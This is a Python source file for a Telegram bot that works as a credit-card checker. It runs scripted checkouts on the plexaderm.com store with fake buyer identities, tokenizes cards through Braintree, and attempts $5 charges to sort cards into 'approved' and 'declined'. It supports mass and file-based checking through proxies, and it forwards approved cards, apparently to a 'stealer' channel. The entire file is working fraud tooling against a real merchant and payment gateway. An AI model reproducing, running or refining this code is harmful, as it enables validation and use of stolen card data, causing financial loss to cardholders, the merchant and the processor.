import time
import asyncio
import re
import os
import json
import base64
import random
import aiohttp
from bs4 import BeautifulSoup
from faker import Faker
from pyrogram import Client, filters, enums
from FUNC.usersdb_func import *
from FUNC.defs import *
from TOOLS.check_all_func import *
from TOOLS.getbin import *
from TOOLS.getcc_for_mass import *

# ========== RESPONSE HANDLER ==========
async def get_charge_resp(result, user_id, fullcc):
    try:
        if type(result) == dict:
            if 'status' in result and 'response' in result:
                status_value = result.get('status', '').lower()
                response_msg = result.get('response', '')
                is_live = result.get('is_live', False)

                if status_value == 'approved' or is_live:
                    status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
                    hits = "YES"
                    await forward_resp(fullcc, "Braintree $5", response_msg)
                else:
                    status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
                    hits = "NO"

                return {"status": status, "response": response_msg, "hits": hits, "fullz": fullcc}
        if type(result) == str:
            status = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌"
            response = result
            hits = "NO"
            if "approved" in result.lower() or "charged" in result.lower() or "success" in result.lower():
                status = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅"
                hits = "YES"
                await forward_resp(fullcc, "Braintree $5", result)
            return {"status": status, "response": response, "hits": hits, "fullz": fullcc}
        return {"status": "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌", "response": "Card Declined ❌", "hits": "NO", "fullz": fullcc}
    except Exception as e:
        return {"status": "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌", "response": str(e), "hits": "NO", "fullz": fullcc}

# ========== CONFIGURATION ==========
GATE_NAME = "Braintree - Plexaderm (5$)"
MAX_MSC_LIMIT = 10
MAX_TSC_LIMIT = 100
OWNER_DM = "https://t.me/spid_3r"
SYMBOL = f"<a href='{OWNER_DM}'>㊕</a>"
STEALER_CHANNEL_ID = -1003627495953

fake = Faker()

# ========== HELPER FUNCTIONS ==========
def random_name(): return fake.first_name(), fake.last_name()
def random_email(): return fake.email()
def random_phone(): return fake.phone_number()[:10]
def random_address(): return fake.street_address()
def random_city(): return fake.city()
def random_zip(): return fake.postcode()[:5]
def random_hex(length=32): return ''.join(random.choices('0123456789abcdef', k=length))
def random_guid(): return f"{random_hex(8)}-{random_hex(4)}-{random_hex(4)}-{random_hex(4)}-{random_hex(12)}"

def get_card_type(card_number):
    first_four = card_number[:4]
    first_two = card_number[:2]
    first_one = card_number[0]
    if first_two in ['34', '37']: return 'American Express'
    if 51 <= int(first_two) <= 55: return 'Mastercard'
    if 2221 <= int(first_four) <= 2720: return 'Mastercard'
    if first_one == '4': return 'Visa'
    if first_four == '6011' or first_two == '65': return 'Discover'
    if 644 <= int(first_four[:3]) <= 649: return 'Discover'
    return 'Visa'

def extract_cards(text): return re.findall(r"\d{15,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}", text)

def extract_jdialog_message(html):
    m = re.search(r'JDialog\(\s*[\'"]([^\'"]+)[\'"]', html)
    return m.group(1) if m else None

def extract_error_message(html):
    m = re.search(r'<div class="errorMessage">(.*?)</div>', html, re.DOTALL)
    return m.group(1).strip() if m else None

def extract_result_value(html):
    m = re.search(r'<input type="hidden" id="OrderValidationResult" value="([^"]+)"', html)
    return m.group(1) if m else None

# ========== BRAINTREE CORE (with improved error messages) ==========
async def get_braintree_token(session, order_id):
    headers = {
        'authority': 'plexaderm.com',
        'accept': '*/*',
        'accept-language': 'tr-TR,tr;q=0.9',
        'referer': 'https://plexaderm.com/checkout/plexaderm/step4',
        'x-requested-with': 'XMLHttpRequest',
    }
    try:
        resp = await session.get('https://plexaderm.com/data/GetBraintreeClientToken', params={'orderId': order_id}, headers=headers, timeout=15)
        data = resp.json()
        encoded_token = data.get('token')
        if encoded_token:
            decoded = base64.b64decode(encoded_token).decode('utf-8')
            token_data = json.loads(decoded)
            return token_data.get('authorizationFingerprint')
    except Exception:
        return None
    return None

async def tokenize_card(session, auth_fingerprint, card_number, exp_month, exp_year, cvv):
    headers = {
        'authorization': f'Bearer {auth_fingerprint}',
        'braintree-version': '2018-05-10',
        'content-type': 'application/json',
        'origin': 'https://assets.braintreegateway.com',
        'referer': 'https://assets.braintreegateway.com/',
    }
    payload = {
        "clientSdkMetadata": {"source": "client", "integration": "dropin2", "sessionId": random_guid()},
        "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token } }",
        "variables": {
            "input": {
                "creditCard": {"number": card_number, "expirationMonth": exp_month, "expirationYear": exp_year, "cvv": cvv},
                "options": {"validate": False}
            }
        },
        "operationName": "TokenizeCreditCard"
    }
    try:
        resp = await session.post('https://payments.braintree-api.com/graphql', headers=headers, json=payload, timeout=15)
        return resp.json()
    except Exception:
        return {}

async def braintree_charge_async(cc, mes, ano, cvv, proxy=None):
    try:
        exp_month = mes.zfill(2)
        exp_year_full = ano if len(ano) == 4 else f"20{ano}"
        card_type = get_card_type(cc)
        first_name, last_name = random_name()
        email = random_email()
        phone = random_phone()
        address = random_address()
        city = random_city()
        zip_code = random_zip()

        proxy_url = None
        if proxy:
            proxy_url = proxy.get("http") if isinstance(proxy, dict) else proxy

        user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
        timeout = aiohttp.ClientTimeout(total=60)
        connector = aiohttp.TCPConnector(ssl=False)
        jar = aiohttp.CookieJar(unsafe=True)

        async with aiohttp.ClientSession(timeout=timeout, connector=connector, cookie_jar=jar,
                                         headers={'User-Agent': user_agent,
                                                  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                                                  'Accept-Language': 'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7'}) as session:

            # Homepage
            async with session.get('https://www.plexaderm.com/', proxy=proxy_url):
                pass
            mvisit = None
            for c in jar:
                if c.key == 'mvisit':
                    mvisit = c.value
                    break
            if not mvisit:
                mvisit = str(random.randint(10**15, 10**16-1))

            # Add to cart
            cart_data = {'items': [{'productId': 154562, 'quantity': 1}], 'withCartReset': False}
            async with session.post('https://www.plexaderm.com/api/cart/add', json=cart_data, proxy=proxy_url) as resp:
                order_id = (await resp.json()).get('orderNumber') if resp.status == 200 else None

            # Checkout step1
            step1_url = f'https://plexaderm.com/checkout/plexaderm/step1?m={mvisit}'
            async with session.get(step1_url, proxy=proxy_url) as resp:
                step1_text = await resp.text()

            soup = BeautifulSoup(step1_text, 'html.parser')
            form_data = {inp['name']: inp['value'] for inp in soup.find_all('input', type='hidden') if inp.get('name') and inp.get('value')}

            # Parse cart offers
            cc_match = re.search(r'var ___currentCart = (\[.*?\]);', step1_text, re.DOTALL)
            if cc_match:
                try:
                    for idx, item in enumerate(json.loads(cc_match.group(1))):
                        form_data[f'CartOffers[{idx}].OfferId'] = str(item['offerId'])
                        form_data[f'CartOffers[{idx}].OfferName'] = item['offerName']
                        form_data[f'CartOffers[{idx}].Quantity'] = str(item['quantity'])
                except: pass
            po_match = re.search(r'var ___pageOffers = (\[.*?\]);', step1_text, re.DOTALL)
            if po_match:
                try:
                    for idx, item in enumerate(json.loads(po_match.group(1))):
                        form_data[f'PageOffers[{idx}].OfferId'] = str(item['offerId'])
                        form_data[f'PageOffers[{idx}].OfferName'] = item['name']
                        form_data[f'PageOffers[{idx}].Quantity'] = '0'
                except: pass

            # Set flags
            flags = ['ContainsCreditCard', 'ContainsShippingData', 'ContainsBillingData', 'ContainsPromoCode',
                     'AutoDetectCreditCardType', 'HasFinalCheckoutButton']
            for f in flags: form_data[f] = 'True'
            false_flags = ['ContainsGift', 'ContainsAdditionalData', 'ContainsGiftCard', 'IsEmailConfirmationRequired',
                           'IsHidePayPalForMultiPay', 'ShowCheckoutConfirm']
            for f in false_flags: form_data[f] = 'False'
            form_data['PaymentMethod'] = 'card'
            form_data['MailingListAgreement'] = 'true'
            form_data['SmsListAgreement'] = 'false'
            form_data['PromoCode'] = ''
            form_data['IsZipMismatchConfirmed'] = 'true'

            # Shipping / Billing
            form_data['ShippingFirstName'] = first_name
            form_data['ShippingLastName'] = last_name
            form_data['ShippingEmail'] = email
            form_data['ShippingPhone'] = phone
            form_data['ShippingAddress1'] = address
            form_data['ShippingAddress2'] = ''
            form_data['ShippingZip'] = zip_code
            form_data['ShippingCity'] = city
            form_data['ShippingStateId'] = '34'
            form_data['ShippingCountryId'] = '1'
            form_data['BillingSameAsShipping'] = 'true'
            form_data['BillingFirstName'] = first_name
            form_data['BillingLastName'] = last_name
            form_data['BillingEmail'] = email
            form_data['BillingPhone'] = phone
            form_data['BillingAddress1'] = address
            form_data['BillingAddress2'] = ''
            form_data['BillingZip'] = zip_code
            form_data['BillingCity'] = city
            form_data['BillingStateId'] = '34'
            form_data['BillingCountryId'] = '1'

            if not order_id:
                oid_match = re.search(r'var ___orderId = "(\d+)"', step1_text)
                order_id = oid_match.group(1) if oid_match else str(random.randint(10**7, 10**8-1))

            # Get Braintree token
            auth_fp = await get_braintree_token(session, order_id)
            if not auth_fp:
                return "Declined", "Unable to obtain Braintree client token – site may be blocking"

            # Tokenize
            tok_res = await tokenize_card(session, auth_fp, cc, exp_month, exp_year_full, cvv)
            pm_token = tok_res.get('data', {}).get('tokenizeCreditCard', {}).get('token')
            if not pm_token:
                err = tok_res.get('errors', [{}])[0].get('message', 'Tokenization failed')
                return "Declined", f"Tokenization: {err}"

            form_data['Token'] = pm_token
            form_data['CreditCardNumber'] = ''
            form_data['CreditCardMonth'] = exp_month
            form_data['CreditCardYear'] = exp_year_full
            form_data['CreditCardSecurityCode'] = ''
            form_data['CreditCardBin'] = cc[:6]
            form_data['CardType'] = card_type

            await session.get(f'https://plexaderm.com/checkout/plexaderm/step2?un=1&m={mvisit}', proxy=proxy_url)

            # Final submission
            step4_url = f'https://plexaderm.com/checkout/plexaderm/step4?m={mvisit}'
            post_data = {}
            for k, v in form_data.items():
                if isinstance(v, list):
                    for i, val in enumerate(v):
                        post_data[f"{k}[{i}]"] = val
                else:
                    post_data[k] = v
            headers_post = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://plexaderm.com', 'Referer': step1_url}
            async with session.post(step4_url, headers=headers_post, data=post_data, proxy=proxy_url, allow_redirects=True) as resp:
                checkout_text = await resp.text()

            # Extract site response
            msg = extract_jdialog_message(checkout_text) or extract_error_message(checkout_text) or extract_result_value(checkout_text) or "No response from server"
            if any(word in msg.lower() for word in ['approved', 'charged', 'success']):
                return "Approved", f"✅ Charged $5 - {msg}"
            else:
                return "Declined", msg

    except asyncio.TimeoutError:
        return "Declined", "⏱️ Request timeout – site or proxy unreachable"
    except aiohttp.ClientError as e:
        return "Declined", f"🌐 Network error: {type(e).__name__}"
    except Exception as e:
        err_msg = str(e) if str(e) else f"Unknown error: {type(e).__name__}"
        return "Declined", f"⚠️ {err_msg}"

async def create_braintree_charge(fullz, proxy=None):
    parts = fullz.split("|")
    if len(parts) != 4:
        return {"status": "Declined", "response": "Invalid format", "is_live": False}
    cc, mes, ano, cvv = parts[0].strip(), parts[1].strip().zfill(2), parts[2].strip(), parts[3].strip()
    status, response = await braintree_charge_async(cc, mes, ano, cvv, proxy)
    return {"cc": fullz, "status": status, "response": response, "is_live": (status == "Approved")}

# ========== BOT COMMANDS ==========
async def call_braintree_api(fullcc, user_id):
    result = await create_braintree_charge(fullcc)
    processed = await get_charge_resp(result, user_id, fullcc)
    return processed["status"], processed["response"]

@Client.on_message(filters.command("chk", [".", "/"]))
async def single_check(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]: return
        role = checkall[1]
        getcc = await getmessage(message)
        if not getcc:
            await message.reply_text(f"✦ <b>ɴᴏ ᴄᴄ ꜰᴏᴜɴᴅ</b> ✦\n⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n↪ <b>ᴜꜱᴀɢᴇ :</b> /chk cc|mm|yy|cvv", quote=True, parse_mode=enums.ParseMode.HTML)
            return
        cc, mes, ano, cvv = getcc[0], getcc[1], getcc[2], getcc[3]
        fullcc = f"{cc}|{mes}|{ano}|{cvv}"

        msg = await message.reply_text(f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>\n{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■□□□", quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
        await client.edit_message_text(message.chat.id, msg.id, f"✧ ᴄʜᴇᴄᴋɪɴɢ.. ✧\n\n{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>\n{SYMBOL} 𝙍𝙚𝙨𝙥𝙤𝙣𝙨𝙚 -» ■■■□", parse_mode=enums.ParseMode.HTML)
        start = time.perf_counter()
        status, api_message = await call_braintree_api(fullcc, user_id)
        elapsed = time.perf_counter() - start
        await client.edit_message_text(message.chat.id, msg.id, f"✧ ᴄʜᴇᴄᴋɪɴɢ... ✧\n\n{SYMBOL} 𝘾𝘾 -» <code>{fullcc}</code>\n{SYMBOL} 𝙂𝙖𝙩𝙚 -» <i>{GATE_NAME}</i>\n{SYMBOL} 𝙍𝙚𝙨𝙥𝙤ɴꜱᴇ -» ■■■■", parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)

        getbin = await get_bin_details(cc)
        brand, type_, level, bank, country, flag, currency = getbin[0], getbin[1], getbin[2], getbin[3], getbin[4], getbin[5], getbin[6]
        final_text = f"<b>{status}</b>\n\n{SYMBOL} 𝗖𝗖 ⇾ <code>{fullcc}</code>\n{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}\n{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {api_message}\n\n{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {brand}_{type_}-{level}\n{SYMBOL} 𝗕ᴀɴᴋ: {bank}\n{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {country} {flag}\n\n{SYMBOL} 𝗧ᴏᴏᴋ {elapsed:.2f} 𝘀ᴇᴄᴏɴᴅs\n{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})"
        await client.edit_message_text(message.chat.id, msg.id, final_text, disable_web_page_preview=True, parse_mode=enums.ParseMode.HTML)
        await setantispamtime(user_id)
        await deductcredit(user_id)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

@Client.on_message(filters.command("mchk", [".", "/"]))
async def mass_check(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]: return
        role = checkall[1]
        getcc = await getcc_for_mass(message, role)
        if not getcc[0]:
            await message.reply_text(getcc[1], message.id, parse_mode=enums.ParseMode.HTML)
            return
        ccs = getcc[1]
        if len(ccs) > MAX_MSC_LIMIT:
            await message.reply_text(f"✦ ᴍᴀx {MAX_MSC_LIMIT} ᴄᴄ ᴀʟʟᴏᴡᴇᴅ. ʏᴏᴜ ᴘʀᴏᴠɪᴅᴇᴅ {len(ccs)} ✦", message.id, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_MSC_LIMIT]
        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

@Client.on_message(filters.command("tchk", [".", "/"]))
async def txt_check(client, message):
    try:
        user_id = str(message.from_user.id)
        first_name = message.from_user.first_name
        checkall = await check_all_thing(client, message)
        if not checkall[0]: return
        role = checkall[1]
        target = None
        if message.reply_to_message and message.reply_to_message.document:
            target = message.reply_to_message
        elif message.document:
            target = message
        if not target or not target.document.file_name.endswith(".txt"):
            await message.reply_text(f"✦ <b>ɴᴏ ꜰɪʟᴇ ꜰᴏᴜɴᴅ</b> ✦\n⟢ <b>ɢᴀᴛᴇ :</b> {GATE_NAME}\n↪ <b>ᴜꜱᴀɢᴇ :</b> Reply to a .txt file (max {MAX_TSC_LIMIT} cards)", quote=True, parse_mode=enums.ParseMode.HTML)
            return
        file_path = await client.download_media(target)
        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            ccs = extract_cards(f.read())
        os.remove(file_path)
        if not ccs:
            await message.reply("✦ ɴᴏ ᴠᴀʟɪᴅ ᴄᴀʀᴅꜱ ꜰᴏᴜɴᴅ ɪɴ ꜰɪʟᴇ ✗ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            return
        if len(ccs) > MAX_TSC_LIMIT:
            await message.reply(f"✦ ᴏɴʟʏ ꜰɪʀꜱᴛ {MAX_TSC_LIMIT} ᴄᴀʀᴅꜱ ᴡɪʟʟ ʙᴇ ᴘʀᴏᴄᴇꜱꜱᴇᴅ ✦", quote=True, parse_mode=enums.ParseMode.HTML)
            ccs = ccs[:MAX_TSC_LIMIT]
        await process_sequential(client, message, ccs, user_id, first_name, role)
    except Exception:
        import traceback
        await error_log(traceback.format_exc())

async def process_sequential(client, message, ccs, user_id, first_name, role):
    total = len(ccs)
    approved = 0
    declined = 0
    start_time = time.perf_counter()
    approved_cards = []
    prog = await message.reply(f"Braintree Plexaderm Checker\n\n{SYMBOL} Progress: 0/{total}\nApproved ✅: 0\nDeclined ❌: 0\nRemaining: {total}\n\nChecked by: {first_name} ({role})", quote=True, parse_mode=enums.ParseMode.HTML)
    for idx, fullcc in enumerate(ccs, 1):
        status, api_message = await call_braintree_api(fullcc, user_id)
        cc_num = fullcc.split('|')[0]
        bin_data = await get_bin_details(cc_num)
        brand = bin_data[0] if len(bin_data)>0 else "Unknown"
        type_ = bin_data[1] if len(bin_data)>1 else "Unknown"
        level = bin_data[2] if len(bin_data)>2 else "Unknown"
        bank = bin_data[3] if len(bin_data)>3 else "Unknown"
        country = bin_data[4] if len(bin_data)>4 else "Unknown"
        flag = bin_data[5] if len(bin_data)>5 else ""
        if "Approved" in status:
            approved += 1
            card_time = time.perf_counter() - start_time
            approved_cards.append({"fullcc": fullcc, "status": status, "response": api_message, "brand": f"{brand}_{type_}-{level}", "bank": bank, "country": country, "flag": flag, "time": card_time})
        else:
            declined += 1
        remaining = total - idx
        try:
            await client.edit_message_text(message.chat.id, prog.id, f"Braintree Plexaderm Checker\n\n{SYMBOL} Progress: {idx}/{total}\nApproved ✅: {approved}\nDeclined ❌: {declined}\nRemaining: {remaining}\n\nChecked by: {first_name} ({role})", parse_mode=enums.ParseMode.HTML)
        except:
            pass
        await asyncio.sleep(0.5)
    await prog.delete()
    for card in approved_cards:
        await message.reply_text(f"<b>{card['status']}</b>\n\n{SYMBOL} 𝗖𝗖 ⇾ <code>{card['fullcc']}</code>\n{SYMBOL} 𝗚𝗮ᴛᴇᴡᴀʏ ⇾ {GATE_NAME}\n{SYMBOL} 𝗥ᴇsᴘᴏɴsᴇ ⇾ {card['response']}\n\n{SYMBOL} 𝗕𝗜𝗡 𝗜ɴꜰᴏ: {card['brand']}\n{SYMBOL} 𝗕ᴀɴᴋ: {card['bank']}\n{SYMBOL} 𝗖ᴏᴜɴᴛʀʏ: {card['country']} {card['flag']}\n\n{SYMBOL} 𝗧ᴏᴏᴋ {card['time']:.2f} 𝘀ᴇᴄᴏɴᴅs\n{SYMBOL} 𝗖ʜᴇᴄᴋᴇᴅ 𝗕ʏ: <a href='tg://user?id={user_id}'>{first_name}</a> ({role})", quote=True, parse_mode=enums.ParseMode.HTML)
        await asyncio.sleep(0.5)
    elapsed = round(time.perf_counter() - start_time, 2)
    if approved > 0:
        declined_list = [cc for cc in ccs if cc not in [c['fullcc'] for c in approved_cards]]
        decl_txt = f"❌ 𝗗𝗲𝗰𝗹ɪɴᴇᴅ 𝗖ᴀʀᴅ𝘀 ({declined})\n\n━━━━━━━━━━━━━━━━━━━━\n"
        for c in declined_list[:15]:
            decl_txt += f"{SYMBOL} {c} → Declined\n"
        if declined > 15:
            decl_txt += f"\n... and {declined - 15} more declined cards"
        decl_txt += f"\n━━━━━━━━━━━━━━━━━━━━\n✅ Approved: {approved}\n❌ Declined: {declined}\n📊 Total: {total}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})"
        await message.reply_text(decl_txt, quote=True, parse_mode=enums.ParseMode.HTML)
    else:
        await message.reply_text(f"❌ 𝗡ᴏ 𝗔ᴘᴘʀᴏᴠᴇᴅ 𝗖ᴀʀᴅ𝘀\n\n━━━━━━━━━━━━━━━━━━━━\n📊 Total Cards: {total}\n❌ All Declined: {declined}\n⏱ Time: {elapsed}s\n👤 Checked by: {first_name} ({role})", quote=True, parse_mode=enums.ParseMode.HTML)
    await setantispamtime(user_id)
    await massdeductcredit(user_id, total)
